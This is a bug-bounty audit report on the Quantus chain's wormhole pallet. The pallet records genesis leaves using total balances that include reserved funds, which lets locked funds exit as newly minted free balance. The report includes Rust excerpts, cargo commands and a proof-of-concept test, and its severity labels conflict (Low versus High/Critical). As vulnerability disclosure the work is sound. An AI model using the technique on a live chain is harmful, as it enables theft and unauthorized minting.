# 89077 bc low incorrect genesis balance accounting in wormhole on initialize allows reserved locked funds to be exited as free balance leading to direct loss of funds and unauthorized minting

**Submitted on Aug 17th 2026 at 00:57:29 UTC by @argusdev for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #89077
* **Report Type:** Blockchain/DLT
* **Report severity:** Low
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-chain>
* **Impacts:**
  * Direct loss of funds
  * Inflation bugs (unauthorized minting)

## Description

### Brief / Intro

`pallet-wormhole` records genesis ZK leaves using `Currency::total_balance`, which includes reserved and locked funds. Because exits are minted as free balance without reducing the original reserved balance, an attacker can convert locked genesis funds into freely spendable funds while keeping the original lock intact.

### Vulnerability Details

During the genesis block, `pallet-wormhole::on_initialize(1)` iterates every account and creates a ZK leaf for each non-zero balance:

```rust
// pallets/wormhole/src/lib.rs:478-487
for who in frame_system::Account::<T>::iter_keys() {
    let amount = <T::Currency as Currency<_>>::total_balance(&who);
    if amount.is_zero() { continue; }
    let to: T::WormholeAccountId = who.into();
    Self::record_transfer(T::AssetId::default(), &minting_account, &to, amount);
}
```

The leaf amount is `total_balance`, so any reserved or locked balance is included in the leaf. The ZK leaf circuit only checks:

1. The leaf exists in the ZK tree.
2. The nullifier is correct.
3. Output ≤ input after the fee.

It does not distinguish between free and reserved balance.

Later, `process_exit_bundle` mints the exit output as free balance:

```rust
// pallets/wormhole/src/lib.rs:828-847
match <T::Currency as Unbalanced<_>>::increase_balance(
    exit_account,
    *exit_balance,
    frame_support::traits::tokens::Precision::Exact,
) { ... }
```

`increase_balance` credits the exit account without consuming or unlocking the original account's reserved balance. Consequently, an attacker who controls a genesis account with reserved funds can keep the reserved balance locked on the original account and receive an equivalent, minus fee, amount of free balance on an exit account.

This violates the invariant that a wormhole leaf should represent only spendable value.

### Impact Details

* **Double-liquidity of locked funds:** Reserved/locked balance stays on the original account while an equivalent amount of free balance is minted to the exit account, effectively inflating spendable supply.
* **Circumvention of economic locks:** Vesting, staking bonds, treasury locks, and governance locks become ineffective against wormhole exits.
* **Conditional severity:** Exploitable whenever any account holds reserved balance at leaf-generation time. If genesis contains no reserved balances today, the code is unsafe by design and silently becomes exploitable as soon as any lock appears. Rated High; Critical if material reserved balances exist at genesis.

### References

* `pallets/wormhole/src/lib.rs:478-487` — genesis leaf recording using `total_balance`
* `pallets/wormhole/src/lib.rs:737-998` — `process_exit_bundle`
* `pallets/wormhole/src/lib.rs:828-847` — exit minting via `Unbalanced::increase_balance`
* `pallets/wormhole/src/lib.rs:1280-1310` — `record_transfer`
* Commit audited: `94c4ca7a`

## Link to Proof of Concept

<https://gist.github.com/jonah-space/c1f4bba446b0baa14649f1de5d515eaf>

## Proof of Concept

### Steps to reproduce

{% stepper %}
{% step %}

## Build the test environment

```bash
cd chain
. "$HOME/.cargo/env"
```

{% endstep %}

{% step %}

## Run the end-to-end PoC that uses a real ZK proof

```bash
cargo test -p pallet-wormhole --lib \
  genesis_reserved_balance_exits_end_to_end_with_real_proof -- --nocapture
```

What it does:

* Endows the test account with 20 UNIT (15 UNIT free + 5 UNIT reserved).
* Pre-sets `TransferCount = 1` so the inserted leaf matches the committed `private_batch.hex` fixture proof.
* Records a leaf for the full 20 UNIT via `Wormhole::record_transfer`.
* Submits the real fixture proof through `Wormhole::verify_private_batch`.
* Asserts the original account still holds 5 UNIT reserved and the exit account receives 19.98 UNIT free balance.
* Note: the fixture uses `transfer_count = 1` while genesis leaves use `transfer_count = 0`; the circuit validates both identically, only the proof needs to be regenerated.
  {% endstep %}

{% step %}

## Run the dispatch-path isolation PoC

This PoC bypasses the ZK verifier to isolate the accounting bug.

```bash
cargo test -p pallet-wormhole --lib \
  genesis_reserved_balance_is_exitable_as_free_balance -- --nocapture
```

What it does:

* Endows the test account with 20 UNIT (10 UNIT free + 10 UNIT reserved).
* Triggers `on_initialize(1)` to record the genesis leaf.
* Directly calls `process_exit_bundle` to mint the full 20 UNIT.
* Asserts the original reserved balance remains and the exit account receives 20 UNIT free balance.
  {% endstep %}

{% step %}

## Run the full test suite

```bash
cargo test -p pallet-wormhole --lib
# result: 71 passed, 3 ignored
```

{% endstep %}
{% endstepper %}

### PoC Test

Add the following test to `pallets/wormhole/src/tests.rs` (requires making `test_account()` / `TEST_SECRET` `pub(crate)` and adding `Currency`, `ReservableCurrency`, `Inspect` imports):

```rust
#[test]
fn genesis_reserved_balance_exits_end_to_end_with_real_proof() {
    use super::wormhole_tests::test_account;

    let free_endowment = 15 * UNIT;
    let reserved_amount = 5 * UNIT;
    let total_leaf_amount = free_endowment + reserved_amount; // 20 UNIT
    let expected_exit = 1998u32 as u128 * crate::SCALE_DOWN_FACTOR;
    let exit_recipient = AccountId32::new([4u8; 32]);

    new_test_ext_with_endowments(vec![(test_account(), total_leaf_amount)]).execute_with(|| {
        System::set_block_number(1);

        // Lock 5 UNIT as reserved; total_balance is still 20 UNIT.
        assert_ok!(<Balances as ReservableCurrency<AccountId>>::reserve(
            &test_account(), reserved_amount
        ));
        assert_eq!(
            <Balances as Currency<AccountId>>::total_balance(&test_account()),
            total_leaf_amount
        );

        // Insert a leaf for the full total_balance (matches the fixture proof).
        TransferCount::<Test>::insert(test_account(), 1);
        Wormhole::record_transfer(
            0u32,
            &MINTING_ACCOUNT,
            &test_account(),
            total_leaf_amount
        );

        let leaf = ZkTree::leaf(0).unwrap();
        assert_eq!(leaf.amount, total_leaf_amount); // BUG: leaf includes reserved funds

        setup_valid_block_state_for_test_proof();

        // Submit the real fixture ZK proof through the production extrinsic.
        assert_ok!(Wormhole::verify_private_batch(
            RawOrigin::None.into(),
            get_test_proof_bytes(),
        ));

        // Reserved funds remain locked, yet exit recipient received free balance.
        assert_eq!(
            <Balances as ReservableCurrency<AccountId>>::reserved_balance(&test_account()),
            reserved_amount
        );
        assert_eq!(Balances::balance(&exit_recipient), expected_exit);
    });
}
```

Run:

```bash
cd chain && cargo test -p pallet-wormhole --lib \
  genesis_reserved_balance_exits_end_to_end_with_real_proof -- --nocapture
```

A second test (`genesis_reserved_balance_is_exitable_as_free_balance`) bypasses the ZK verifier and calls `process_exit_bundle` directly to isolate the same accounting bug.
